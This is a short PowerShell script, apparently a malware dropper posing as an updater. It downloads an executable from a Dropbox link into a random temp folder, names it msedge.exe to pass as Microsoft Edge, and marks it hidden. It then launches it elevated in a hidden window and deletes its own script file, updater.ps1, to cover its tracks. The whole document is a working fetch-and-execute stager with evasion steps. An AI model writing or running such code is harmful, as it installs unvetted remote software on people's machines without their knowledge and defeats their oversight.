#sleep
start-sleep 10

#change directory
cd $env:temp/sVBXKuz

#download new file
Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/y1cen9nbe4ghgi4hm2nmi/wsappa-1.7.exe?rlkey=dgtqp22fbwpgl18jvuvj6i1lb&dl=0" -OutFile msedge_new.exe
Copy-Item -Path .\msedge_new.exe -Destination .\msedge.exe -Force

#delete old file
Remove-Item .\msedge_new.exe
Remove-Item .\wsappa.exe

#sleep
start-sleep 2


# Set "Hidden" attribute on the file
$filePath = Join-Path $env:temp\sVBXKuz "msedge.exe"
$attr = [System.IO.FileAttributes]::Hidden
[System.IO.File]::SetAttributes($filePath, $attr)

#start new file
Start-Process -FilePath "$env:temp/sVBXKuz/msedge.exe" -Verb RunAs -WindowStyle Hidden



#sleep
start-sleep 2

#clean uo
powershell.exe /c Remove-Item $env:temp/sVBXKuz/updater.ps1
